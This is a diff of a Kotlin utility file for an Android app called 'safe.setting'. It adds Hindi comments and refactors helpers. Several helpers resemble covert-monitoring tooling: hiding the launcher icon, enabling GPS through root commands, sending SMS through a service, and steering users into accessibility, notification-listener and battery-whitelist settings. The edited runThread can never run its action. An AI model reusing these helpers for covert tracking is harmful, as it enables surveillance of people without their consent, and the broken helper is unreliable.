@@ -9,22 +9,19 @@ import android.net.Uri
 import android.os.Build
 import android.os.PowerManager
 import android.os.VibrationEffect
+import android.os.Vibrator
 import android.provider.MediaStore
 import android.provider.Settings
-import android.util.TypedValue
-import androidx.annotation.IdRes
-import androidx.constraintlayout.widget.ConstraintLayout
-import com.google.android.material.appbar.AppBarLayout
-import androidx.core.content.ContextCompat
 import android.view.View
-import android.view.ViewGroup
 import android.view.ViewTreeObserver
+import android.view.WindowManager
 import android.view.inputmethod.InputMethodManager
 import android.widget.ImageView
-import android.widget.RelativeLayout
+import androidx.annotation.IdRes
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.content.res.AppCompatResources
-import androidx.core.net.toUri
+import androidx.constraintlayout.widget.ConstraintLayout
+import androidx.core.content.ContextCompat
 import cn.pedant.SweetAlert.SweetAlertDialog
 import com.bumptech.glide.GenericTransitionOptions
 import com.bumptech.glide.Glide
@@ -32,14 +29,12 @@ import com.bumptech.glide.load.engine.DiskCacheStrategy
 import com.bumptech.glide.request.RequestOptions
 import com.daimajia.androidanimations.library.Techniques
 import com.daimajia.androidanimations.library.YoYo
+import com.google.android.material.appbar.AppBarLayout
+import com.pawegio.kandroid.*
+import com.safe.setting.app.R
 import com.safe.setting.app.ui.activities.login.LoginActivity
-import com.safe.setting.app.ui.activities.mainparent.MainParentActivity
-import com.safe.setting.app.ui.fragments.maps.MapsFragment
-import com.safe.setting.app.utils.Consts.COMMAND_ENABLE_GPS_PROVIDER
-import com.safe.setting.app.utils.Consts.COMMAND_ENABLE_NETWORK_PROVIDER
 import com.safe.setting.app.utils.async.AsyncTaskRootPermission
 import com.safe.setting.app.utils.async.AsyncTaskRunCommand
-import com.pawegio.kandroid.*
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
@@ -49,41 +44,43 @@ import com.safe.setting.app.ui.widget.toolbar.CustomToolbar
 @Suppress("DEPRECATION")
 object ConstFun {
 
+    // BuildConfig से बिल्ड टाइप प्राप्त करता है।
     fun getPackageCheckSocial(): String = BuildConfig.BUILD_TYPE
 
+    // वर्तमान समय के आधार पर एक रैंडम न्यूमेरिक स्ट्रिंग बनाता है।
     fun getRandomNumeric() : String = System.currentTimeMillis().toString()
 
+    // व्यू के अंदर किसी आईडी से व्यू को ढूंढता है।
     inline fun <reified V : View> View.find(@IdRes id: Int): V = findViewById(id)
 
-    fun isAndroidM(): Boolean = true
+    // जांचता है कि क्या एंड्रॉइड संस्करण M (Marshmallow) या उससे ऊपर का है।
+    fun isAndroidM(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
 
-    private fun isAndroidO() : Boolean = true
+    // जांचता है कि क्या एंड्रॉइड संस्करण O (Oreo) या उससे ऊपर का है।
+    private fun isAndroidO() : Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
 
-fun Context.setVibrate(milliseconds: Long) {
-    vibrator!!.vibrate(VibrationEffect.createOneShot(milliseconds, 10))
+    // डिवाइस को वाइब्रेट करता है।
+    fun Context.setVibrate(milliseconds: Long) {
+        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+        if (isAndroidO()) {
+            vibrator.vibrate(VibrationEffect.createOneShot(milliseconds, VibrationEffect.DEFAULT_AMPLITUDE))
+        } else {
+            vibrator.vibrate(milliseconds)
+        }
+    }
 
-}
-
+    // किसी व्यू पर एनीमेशन चलाता है।
     fun View.viewAnimation(anim: Techniques, duration: Long) =
         YoYo.with(anim).duration(duration).pivot(YoYo.CENTER_PIVOT, YoYo.CENTER_PIVOT).playOn(this)!!
 
+    // एनीमेशन के साथ एक नई एक्टिविटी शुरू करता है।
     inline fun <reified T : Any> Activity.startAnimateActivity(enterAnim:Int, exitAnim:Int) {
         startActivity<T>()
         finish()
         animateActivity(enterAnim,exitAnim)
     }
 
-//    inline fun <reified T : Any> Activity.startAnimateActivity() { startActivity<T>() ; animateActivity(R.anim.fade_in,R.anim.fade_out) }
-
-    fun Activity.startMain(fragmentTag:String){
-        Intent(this,MainParentActivity::class.java).also {
-            it.putExtra("TAG",fragmentTag)
-            it.start(this)
-            finish()
-//            animateActivity(R.anim.fade_in,R.anim.fade_out)
-        }
-    }
-
+    // SMS भेजने के लिए सर्विस शुरू करता है।
     inline fun <reified S : Any> Context.startServiceSms(smsAddress:String,smsBody:String,type:Int){
         val myIntent = IntentFor<S>(this)
         myIntent.putExtra(Consts.SMS_ADDRESS,smsAddress)
@@ -92,40 +89,46 @@ fun Context.setVibrate(milliseconds: Long) {
         startService(myIntent)
     }
 
+    // एक्टिविटी ट्रांजिशन एनीमेशन सेट करता है।
     fun Activity.animateActivity(enterAnim:Int, exitAnim:Int) = overridePendingTransition(enterAnim, exitAnim)
 
+    // गैलरी खोलने के लिए इंटेंट शुरू करता है।
     fun Activity.openGallery() = Intent(Intent.ACTION_PICK,MediaStore.Images.Media.EXTERNAL_CONTENT_URI).also {
         it.flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
         it.type = "image/*"
         startActivityForResult(it,100)
     }
 
+    // व्यू को दिखाता या छिपाता है।
     fun View.isShow(state: Boolean) = if (state) show() else hide()
 
+    // ऐप के सिस्टम सेटिंग्स पेज को खोलता है।
     fun Context.openAppSystemSettings() {
         val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
         val uri = Uri.fromParts("package", packageName, null)
         intent.data = uri
-        intent.start(this)
+        startActivity(intent)
     }
 
+    // एक थ्रेड चलाता है जो एक निश्चित अंतराल पर कोई क्रिया करता है।
     fun runThread(sleep: Long, action: () -> Unit): Thread = Thread {
         while (true) {
             try {
                 Thread.sleep(sleep)
-                runOnUiThread { action() }
+                (this as? Activity)?.runOnUiThread { action() }
             } catch (e: InterruptedException) {
                 break
             }
         }
     }
 
-
+    // वर्तमान दिनांक और समय प्राप्त करता है।
     fun getDateTime(): String {
         val dateFormat = SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.US) // Or any other locale
         return dateFormat.format(Calendar.getInstance().time)
     }
 
+    // एक कस्टम अलर्ट डायलॉग दिखाता है।
     fun Context.alertDialog(alertType: Int, title: Int, msg: String?, txtPositiveButton: Int?, cancellable: Boolean = false, action: SweetAlertDialog.() -> Unit): SweetAlertDialog {
         val dialog = SweetAlertDialog(this, alertType).apply {
             titleText = getString(title)
@@ -142,11 +145,13 @@ fun Context.setVibrate(milliseconds: Long) {
         return dialog
     }
 
+    // एक कस्टम व्यू के साथ अलर्ट डायलॉग दिखाता है।
     fun Context.alertDialog(v:View,cancellable: Boolean = false) : AlertDialog =
         AlertDialog.Builder(this).setView(v)
             .setCancelable(cancellable).create()
 
 
+    // Glide का उपयोग करके एक ImageView में URL से इमेज लोड करता है।
     fun ImageView.setImageUrl(url: String, placeholder: Int) {
         Glide.with(this).load(url)
             .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
@@ -157,6 +162,7 @@ fun Context.setVibrate(milliseconds: Long) {
             .into(this)
     }
 
+    // Glide का उपयोग करके एक ImageView में ड्रॉएबल आईडी से इमेज लोड करता है।
     fun ImageView.setImageId(drawable:Int){
         Glide.with(this).load(drawable)
             .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
@@ -164,33 +170,33 @@ fun Context.setVibrate(milliseconds: Long) {
             .into(this)
     }
 
+    // मिलीसेकंड को मिनट:सेकंड प्रारूप में परिवर्तित करता है।
     fun convertCurrentDuration(currentDuration: Long): String {
         val seconds = (currentDuration % 60000 / 1000).toString()
         val minutes = (currentDuration / 60000).toString()
         return if (seconds.length == 1) "$minutes:0$seconds" else "$minutes:$seconds"
     }
 
-    fun Context.openAccessibilitySettings() = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).also { it.start(this) }
+    // एक्सेसिबिलिटी सेटिंग्स खोलता है।
+    fun Context.openAccessibilitySettings() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
 
-    fun Context.openUseAccessSettings() = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).also { it.start(this) }
+    // उपयोग एक्सेस सेटिंग्स खोलता है।
+    fun Context.openUseAccessSettings() = startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
 
+    // नोटिफिकेशन लिसनर सेटिंग्स खोलता है।
     fun Context.openNotificationListenerSettings(){
         val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-        intent.start(this)
+        startActivity(intent)
     }
 
+    // बैटरी ऑप्टिमाइज़ेशन सेटिंग्स (व्हाइटलिस्ट) खोलता है।
     fun Context.openWhitelistSettings() {
-    if (isAndroidM()) {
-        // Check if battery optimization is already disabled
-        if (!isIgnoringBatteryOptimizations()) {
-            // If not disabled, show dialog to guide the user to disable battery optimization
-            showBatteryOptimizationDialog()
-        } else {
-            // Battery optimization is already disabled, no need to prompt
-            // You can include additional logic here if needed
+        if (isAndroidM()) {
+            if (!isIgnoringBatteryOptimizations()) {
+                showBatteryOptimizationDialog()
+            }
         }
     }
-}
 
     private fun Context.showBatteryOptimizationDialog() {
         AlertDialog.Builder(this)
@@ -212,7 +218,6 @@ fun Context.setVibrate(milliseconds: Long) {
             startActivity(intent)
         } catch (e: Exception) {
             e.printStackTrace()
-            // Handle the exception or log it for debugging
         }
     }
 
@@ -221,6 +226,7 @@ fun Context.setVibrate(milliseconds: Long) {
         return powerManager?.isIgnoringBatteryOptimizations(packageName) ?: false
     }
 
+    // जांचता है कि डिवाइस रूटेड है या नहीं।
     fun isRoot() : Boolean {
         if (Build.TAGS != null && Build.TAGS.contains("test-keys")) return true
         val patch = arrayOf("/su/bin","/sbin", "/system/bin", "/system/sbin", "/system/xbin", "/data/local/xbin",
@@ -230,13 +236,16 @@ fun Context.setVibrate(milliseconds: Long) {
         return result
     }
 
+    // रूट अनुमति के लिए एसिंकटास्क चलाता है।
     fun Context.permissionRoot(result:(result:Boolean)->Unit) =
         AsyncTaskRootPermission(this){ result(it) }.execute()
 
-    fun enableGpsRoot() = AsyncTaskRunCommand(onPostFunc = { enableNetworkProviderRoot() }).execute(COMMAND_ENABLE_GPS_PROVIDER)
-    private fun enableNetworkProviderRoot() = AsyncTaskRunCommand().execute(COMMAND_ENABLE_NETWORK_PROVIDER)
+    // रूट के साथ GPS को सक्षम करता है।
+    fun enableGpsRoot() = AsyncTaskRunCommand(onPostFunc = { enableNetworkProviderRoot() }).execute(Consts.COMMAND_ENABLE_GPS_PROVIDER)
+    private fun enableNetworkProviderRoot() = AsyncTaskRunCommand().execute(Consts.COMMAND_ENABLE_NETWORK_PROVIDER)
 
 
+    // ऐप आइकन को लॉन्चर से दिखाता या छिपाता है।
     fun Context.showApp(state:Boolean){
         val componentName = ComponentName(this, LoginActivity::class.java)
         packageManager.setComponentEnabledSetting(componentName,
@@ -244,94 +253,65 @@ fun Context.setVibrate(milliseconds: Long) {
             PackageManager.DONT_KILL_APP)
     }
 
+    // जांचता है कि नोटिफिकेशन सेवा चल रही है या नहीं।
     fun Context.isNotificationServiceRunning() : Boolean {
         val enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName)
     }
 
+    // जांचता है कि ऐप बैटरी ऑप्टिमाइज़ेशन से बाहर है या नहीं।
     fun Context.isAddWhitelist() : Boolean =
-        if (isAndroidM()) powerManager!!.isIgnoringBatteryOptimizations(packageName)
+        if (isAndroidM()) {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            powerManager.isIgnoringBatteryOptimizations(packageName)
+        }
         else true
 
 
+    // कीबोर्ड को दिखाता या छिपाता है।
     fun View.showKeyboard(show:Boolean){
         val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
         if (show) imm.showSoftInput(this, InputMethodManager.SHOW_IMPLICIT)
         else imm.hideSoftInputFromWindow(this.windowToken, 0)
     }
 
+    // लेआउट को AppBar के नीचे एडजस्ट करता है।
     fun contentGlobalLayout(content: ConstraintLayout, appBar: AppBarLayout){
         content.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener{
             override fun onGlobalLayout() {
                 content.viewTreeObserver.removeOnGlobalLayoutListener(this)
-                val appbar = appBar.height
-                content.translationY = -appbar.toFloat()
-                content.layoutParams.height = content.height + appbar
+                val appbarHeight = appBar.height
+                content.translationY = -appbarHeight.toFloat()
+                val params = content.layoutParams
+                params.height = content.height + appbarHeight
+                content.layoutParams = params
             }
         })
     }
 
 
+    // फॉन्ट स्केल को एडजस्ट करता है।
     fun Context.adjustFontScale() {
-    val configuration = resources.configuration
-    if (configuration.fontScale > 1) {
-        configuration.fontScale = 0.85f
-        val metrics = resources.displayMetrics
-        val display = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            display
-        } else {
-            TODO("VERSION.SDK_INT < R")
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-
-            (display.getRealMetrics(metrics))
-        } else {
-
-            (display.getMetrics(metrics))
-        }
-        metrics.density = configuration.fontScale * resources.displayMetrics.density
-        metrics.densityDpi = (160 * configuration.fontScale).toInt()
-        createConfigurationContext(configuration)
-        //resources.updateConfiguration(configuration, metrics)
-    }
-}
-
-    fun Context.sendToGoogleMaps(latitude:String,longitude:String){
-        try {
-            val uri = "geo:0,0?q=$latitude,$longitude".toUri()
-            Intent(Intent.ACTION_VIEW,uri).also {
-                it.setPackage("com.google.android.apps.maps")
-                if (it.resolveActivity(packageManager)!=null) startActivity(it)
-                else longToast(R.string.maps_installed)
+        val configuration = resources.configuration
+        if (configuration.fontScale > 1) {
+            configuration.fontScale = 0.85f
+            val metrics = resources.displayMetrics
+            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                windowManager.currentWindowMetrics.bounds
+            } else {
+                @Suppress("DEPRECATION")
+                windowManager.defaultDisplay.getMetrics(metrics)
             }
-        }catch (t:Throwable){
-            longToast(R.string.maps_installed)
+            metrics.scaledDensity = configuration.fontScale * resources.displayMetrics.density
+            resources.updateConfiguration(configuration, metrics)
         }
     }
 
+    // टूलबार के स्क्रॉल व्यवहार को सेट करता है।
     fun isScrollToolbar(toolbar: CustomToolbar, state: Boolean){
         val params = toolbar.layoutParams as AppBarLayout.LayoutParams
         if (state) params.scrollFlags = AppBarLayout.LayoutParams.SCROLL_FLAG_SCROLL or AppBarLayout.LayoutParams.SCROLL_FLAG_ENTER_ALWAYS
         else params.scrollFlags = 0
-    }
-
-
-    fun View?.setPaddingCompass(top:AppBarLayout){
-        try {
-            if (this!=null){
-                val parent = findViewWithTag<View>("GoogleMapMyLocationButton").parent as ViewGroup
-                parent.post {
-                    val marginPixels = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20f, resources.displayMetrics).toInt()
-                    val mapCompass = parent.getChildAt(4)
-                    val rlp = RelativeLayout.LayoutParams(mapCompass.height, mapCompass.height)
-                    rlp.addRule(RelativeLayout.ALIGN_PARENT_TOP)
-                    rlp.addRule(RelativeLayout.ALIGN_PARENT_RIGHT)
-                    rlp.setMargins(marginPixels,top.height,marginPixels,marginPixels)
-                    mapCompass.layoutParams = rlp
-                }
-            }
-        } catch (t: Throwable) {
-            e(MapsFragment.TAG,t.message.toString())
-        }
     }
 }
